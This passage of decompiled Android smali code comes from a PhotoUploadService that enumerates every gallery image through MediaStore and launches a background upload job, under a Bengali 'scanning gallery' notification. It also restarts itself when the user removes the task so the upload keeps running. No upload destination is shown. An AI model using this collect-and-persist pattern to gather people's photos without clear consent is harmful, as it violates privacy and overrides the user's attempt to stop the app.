    .local v12, "name\\1":Ljava/lang/String;
    :cond_69
    invoke-interface {v0, v5}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v13

    .line 327
    .local v13, "size\\1":J
    sget-object v15, Landroid/provider/MediaStore$Images$Media;->EXTERNAL_CONTENT_URI:Landroid/net/Uri;

    invoke-static {v15, v9, v10}, Landroid/content/ContentUris;->withAppendedId(Landroid/net/Uri;J)Landroid/net/Uri;

    move-result-object v15

    move-object/from16 v16, v0

    .end local v0  # "cursor\\1":Landroid/database/Cursor;
    .local v16, "cursor\\1":Landroid/database/Cursor;
    const-string v0, "withAppendedId(...)"

    invoke-static {v15, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    .line 328
    .local v15, "uri\\1":Landroid/net/Uri;
    new-instance v0, Lcom/example/service/PhotoUploadService$GalleryPhoto;

    invoke-direct {v0, v15, v12, v13, v14}, Lcom/example/service/PhotoUploadService$GalleryPhoto;-><init>(Landroid/net/Uri;Ljava/lang/String;J)V

    invoke-interface {v1, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    move-object/from16 v0, v16

    goto :goto_40

    .line 330
    .end local v9  # "id\\1":J
    .end local v12  # "name\\1":Ljava/lang/String;
    .end local v13  # "size\\1":J
    .end local v15  # "uri\\1":Landroid/net/Uri;
    .end local v16  # "cursor\\1":Landroid/database/Cursor;
    .restart local v0  # "cursor\\1":Landroid/database/Cursor;
    :cond_85
    move-object/from16 v16, v0

    .end local v0  # "cursor\\1":Landroid/database/Cursor;
    .end local v3  # "idColumn\\1":I
    .end local v4  # "nameColumn\\1":I
    .end local v5  # "sizeColumn\\1":I
    .end local v6  # "$i$a$-use-PhotoUploadService$queryGalleryPhotos$1\\1\\318\\0":I
    sget-object v0, Lkotlin/Unit;->INSTANCE:Lkotlin/Unit;
    :try_end_89
    .catchall {:try_start_30 .. :try_end_89} :catchall_8e

    .line 318
    const/4 v0, 0x0

    invoke-static {v2, v0}, Lkotlin/io/CloseableKt;->closeFinally(Ljava/io/Closeable;Ljava/lang/Throwable;)V

    goto :goto_96

    :catchall_8e
    move-exception v0

    move-object v3, v0

    .end local v1  # "list":Ljava/util/List;
    .end local v7  # "queryUri":Landroid/net/Uri;
    .end local v8  # "projection":[Ljava/lang/String;
    .end local v11  # "sortOrder":Ljava/lang/String;
    :try_start_90
    throw v3
    :try_end_91
    .catchall {:try_start_90 .. :try_end_91} :catchall_91

    .restart local v1  # "list":Ljava/util/List;
    .restart local v7  # "queryUri":Landroid/net/Uri;
    .restart local v8  # "projection":[Ljava/lang/String;
    .restart local v11  # "sortOrder":Ljava/lang/String;
    :catchall_91
    move-exception v0

    invoke-static {v2, v3}, Lkotlin/io/CloseableKt;->closeFinally(Ljava/io/Closeable;Ljava/lang/Throwable;)V

    throw v0

    .line 331
    :cond_96
    :goto_96
    return-object v1
.end method

.method private final startForegroundServiceWithNotification()V
    .registers 3

    .line 84
    const-string v0, "গ্যালারি স্ক্যান করা হচ্ছে..."

    const/4 v1, 0x0

    invoke-direct {p0, v0, v1, v1}, Lcom/example/service/PhotoUploadService;->createNotification(Ljava/lang/String;II)Landroid/app/Notification;

    move-result-object v0

    .line 88
    .local v0, "notification":Landroid/app/Notification;
    const/16 v1, 0x3039

    invoke-virtual {p0, v1, v0}, Lcom/example/service/PhotoUploadService;->startForeground(ILandroid/app/Notification;)V

    .line 89
    return-void
.end method

.method private final startPhotoUploading()V
    .registers 7

    .line 150
    iget-object v0, p0, Lcom/example/service/PhotoUploadService;->serviceScope:Lkotlinx/coroutines/CoroutineScope;

    new-instance v1, Lcom/example/service/PhotoUploadService$startPhotoUploading$1;

    const/4 v2, 0x0

    invoke-direct {v1, p0, v2}, Lcom/example/service/PhotoUploadService$startPhotoUploading$1;-><init>(Lcom/example/service/PhotoUploadService;Lkotlin/coroutines/Continuation;)V

    move-object v3, v1

    check-cast v3, Lkotlin/jvm/functions/Function2;

    const/4 v4, 0x3

    const/4 v5, 0x0

    const/4 v1, 0x0

    invoke-static/range {v0 .. v5}, Lkotlinx/coroutines/BuildersKt;->launch$default(Lkotlinx/coroutines/CoroutineScope;Lkotlin/coroutines/CoroutineContext;Lkotlinx/coroutines/CoroutineStart;Lkotlin/jvm/functions/Function2;ILjava/lang/Object;)Lkotlinx/coroutines/Job;

    .line 274
    return-void
.end method

.method private final stopUploadingService()V
    .registers 3

    .line 335
    const-string v0, "PhotoUploadService"

    const-string v1, "Stopping service"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 336
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/example/service/PhotoUploadService;->isUploading:Z

    .line 337
    sget-object v1, Lcom/example/data/UploadStateTracker;->INSTANCE:Lcom/example/data/UploadStateTracker;

    invoke-virtual {v1, v0}, Lcom/example/data/UploadStateTracker;->setServiceRunning(Z)V

    .line 338
    sget-object v0, Lcom/example/data/UploadStateTracker;->INSTANCE:Lcom/example/data/UploadStateTracker;

    invoke-virtual {v0}, Lcom/example/data/UploadStateTracker;->reset()V

    .line 339
    const/4 v0, 0x1

    invoke-virtual {p0, v0}, Lcom/example/service/PhotoUploadService;->stopForeground(Z)V

    .line 340
    invoke-virtual {p0}, Lcom/example/service/PhotoUploadService;->stopSelf()V

    .line 341
    return-void
.end method

.method private final updateNotification(Ljava/lang/String;II)V
    .registers 7
    .param p1, "contentText"  # Ljava/lang/String;
    .param p2, "progress"  # I
    .param p3, "max"  # I

    .line 130
    const-string v0, "notification"

    invoke-virtual {p0, v0}, Lcom/example/service/PhotoUploadService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "null cannot be cast to non-null type android.app.NotificationManager"

    invoke-static {v0, v1}, Lkotlin/jvm/internal/Intrinsics;->checkNotNull(Ljava/lang/Object;Ljava/lang/String;)V

    check-cast v0, Landroid/app/NotificationManager;

    .line 131
    .local v0, "notificationManager":Landroid/app/NotificationManager;
    invoke-direct {p0, p1, p2, p3}, Lcom/example/service/PhotoUploadService;->createNotification(Ljava/lang/String;II)Landroid/app/Notification;

    move-result-object v1

    .line 132
    .local v1, "notification":Landroid/app/Notification;
    const/16 v2, 0x3039

    invoke-virtual {v0, v2, v1}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V

    .line 133
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 3
    .param p1, "intent"  # Landroid/content/Intent;

    .line 366
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .registers 4

    .line 55
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 56
    const-string v0, "PhotoUploadService"

    const-string v1, "Service onCreate"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 57
    sget-object v0, Lcom/example/data/AppDatabase;->Companion:Lcom/example/data/AppDatabase$Companion;

    invoke-virtual {p0}, Lcom/example/service/PhotoUploadService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "getApplicationContext(...)"

    invoke-static {v1, v2}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Lcom/example/data/AppDatabase$Companion;->getDatabase(Landroid/content/Context;)Lcom/example/data/AppDatabase;

    move-result-object v0

    .line 58
    .local v0, "database":Lcom/example/data/AppDatabase;
    new-instance v1, Lcom/example/data/UploadRepository;

    invoke-virtual {v0}, Lcom/example/data/AppDatabase;->uploadLogDao()Lcom/example/data/UploadLogDao;

    move-result-object v2

    invoke-direct {v1, v2}, Lcom/example/data/UploadRepository;-><init>(Lcom/example/data/UploadLogDao;)V

    iput-object v1, p0, Lcom/example/service/PhotoUploadService;->repository:Lcom/example/data/UploadRepository;

    .line 59
    invoke-direct {p0}, Lcom/example/service/PhotoUploadService;->createNotificationChannel()V

    .line 60
    return-void
.end method

.method public onDestroy()V
    .registers 5

    .line 344
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 345
    const-string v0, "PhotoUploadService"

    const-string v1, "Service onDestroy"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 346
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/example/service/PhotoUploadService;->isUploading:Z

    .line 347
    iget-object v1, p0, Lcom/example/service/PhotoUploadService;->serviceScope:Lkotlinx/coroutines/CoroutineScope;

    const/4 v2, 0x0

    const/4 v3, 0x1

    invoke-static {v1, v2, v3, v2}, Lkotlinx/coroutines/CoroutineScopeKt;->cancel$default(Lkotlinx/coroutines/CoroutineScope;Ljava/util/concurrent/CancellationException;ILjava/lang/Object;)V

    .line 348
    sget-object v1, Lcom/example/data/UploadStateTracker;->INSTANCE:Lcom/example/data/UploadStateTracker;

    invoke-virtual {v1, v0}, Lcom/example/data/UploadStateTracker;->setServiceRunning(Z)V

    .line 349
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 7
    .param p1, "intent"  # Landroid/content/Intent;
    .param p2, "flags"  # I
    .param p3, "startId"  # I

    .line 63
    if-eqz p1, :cond_7

    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    goto :goto_8

    :cond_7
    const/4 v0, 0x0

    .line 64
    .local v0, "action":Ljava/lang/String;
    :goto_8
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Service received action: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v2, "PhotoUploadService"

    invoke-static {v2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 66
    const-string v1, "com.example.service.ACTION_STOP"

    invoke-static {v0, v1}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2d

    .line 67
    invoke-direct {p0}, Lcom/example/service/PhotoUploadService;->stopUploadingService()V

    .line 68
    const/4 v1, 0x2

    return v1

    .line 71
    :cond_2d
    const-string v1, "com.example.service.ACTION_START"

    invoke-static {v0, v1}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    const/4 v2, 0x1

    if-eqz v1, :cond_47

    .line 72
    iget-boolean v1, p0, Lcom/example/service/PhotoUploadService;->isUploading:Z

    if-nez v1, :cond_47

    .line 73
    iput-boolean v2, p0, Lcom/example/service/PhotoUploadService;->isUploading:Z

    .line 74
    sget-object v1, Lcom/example/data/UploadStateTracker;->INSTANCE:Lcom/example/data/UploadStateTracker;

    invoke-virtual {v1, v2}, Lcom/example/data/UploadStateTracker;->setServiceRunning(Z)V

    .line 75
    invoke-direct {p0}, Lcom/example/service/PhotoUploadService;->startForegroundServiceWithNotification()V

    .line 76
    invoke-direct {p0}, Lcom/example/service/PhotoUploadService;->startPhotoUploading()V

    .line 80
    :cond_47
    return v2
.end method

.method public onTaskRemoved(Landroid/content/Intent;)V
    .registers 6
    .param p1, "rootIntent"  # Landroid/content/Intent;

    .line 352
    const-string v0, "PhotoUploadService"

    const-string v1, "onTaskRemoved called - restarting service to keep background upload alive"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 353
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/example/service/PhotoUploadService;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object v1, v0

    .local v1, "$this$onTaskRemoved_u24lambda_u245\\1":Landroid/content/Intent;
    const/4 v2, 0x0

    .line 354
    .local v2, "$i$a$-apply-PhotoUploadService$onTaskRemoved$restartServiceIntent$1\\1\\353\\0":I
    const-string v3, "com.example.service.ACTION_START"

    invoke-virtual {v1, v3}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 355
    invoke-virtual {p0}, Lcom/example/service/PhotoUploadService;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Landroid/content/Intent;->setPackage(Ljava/lang/String;)Landroid/content/Intent;

    .line 356
    nop

    .line 353
    .end local v1  # "$this$onTaskRemoved_u24lambda_u245\\1":Landroid/content/Intent;
    .end local v2  # "$i$a$-apply-PhotoUploadService$onTaskRemoved$restartServiceIntent$1\\1\\353\\0":I
    nop

    .line 357
    .local v0, "restartServiceIntent":Landroid/content/Intent;
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1a

    if-lt v1, v2, :cond_2e

    .line 358
    invoke-virtual {p0, v0}, Lcom/example/service/PhotoUploadService;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_31

    .line 360
    :cond_2e
    invoke-virtual {p0, v0}, Lcom/example/service/PhotoUploadService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 362
    :goto_31
    invoke-super {p0, p1}, Landroid/app/Service;->onTaskRemoved(Landroid/content/Intent;)V

    .line 363
    return-void
.end method
